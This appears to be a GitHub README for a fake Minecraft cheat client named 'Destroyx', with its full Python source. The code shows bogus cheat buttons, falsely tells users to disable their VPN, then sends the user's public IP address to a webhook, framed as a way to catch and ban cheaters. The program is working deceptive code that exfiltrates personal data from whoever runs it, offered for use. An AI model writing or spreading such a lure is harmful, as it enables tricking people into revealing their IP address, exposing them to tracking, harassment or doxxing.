# fake-minecraft-cheat
A software used to get the cheaters ip and ip ban them in servers.
# DISCLAIMER
This is just for educational purposes don't hack anybody.
# About
This cheat is a software which sends the ip to a webhook and then minecraft servers can ip ban them.
# Modify
Clone
```sh
git clone https://github.com/shourgamer2/fake-minecraft-cheat
```
How the code works 
import
```python
import tkinter 
from tkinter import *
from tkinter import messagebox
import socket
from requests import get
import requests
import os 
```
Load function
```python
def load():
    messagebox.showinfo("Load", "Loading,We will check your system and if your system is fine we will load the cheats")
```
Alert to make sure cheaters don't fake their ip
```python
messagebox.showinfo("No vpn", "We use a third party api to inject the cheats and the api does not work if vpn is active.Sorry you have to do this as destroyx is not a modified client its a app not a client so we have to use a api ")
```
Send it
```python
ip = get('https://api.ipify.org').text
webhookURL = ''
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname) 
# Build the structure  of  the message 
data = {
    'username': 'ip',
    'embeds': [{
        'title': 'ip found',
        'description': "ip " + ': ' + ip,
    }]
}
# Send it 
result = requests.post(webhookURL, json = data)

try:
    result.raise_for_status()
except:
    pass
```
Window
```python
root = Tk()
root.title("Destroyx")
root.geometry("400x400")
root.iconbitmap("appicon.ico")
# Wigets
Heading = Label(text="Destroyx").pack()
cheatno1 = Button(text="Aimbot",command=load).pack()
cheatno2 = Button(text="Auto Mine",command=load).pack()
cheatno3 = Button(text="Auto kill",command=load).pack()
cheatno4 = Button(text="Auto win (bedwars only)",command=load).pack()
cheatno5 = Button(text="Auto win (Skywars only)",command=load).pack()
cheatno6 = Button(text="Auto bridge ",command=load).pack()
cheatno7 = Button(text="Free sword",command=load).pack()
cheatno8 = Button(text="Invisible",command=load).pack()




# Run it 
root.mainloop()
```
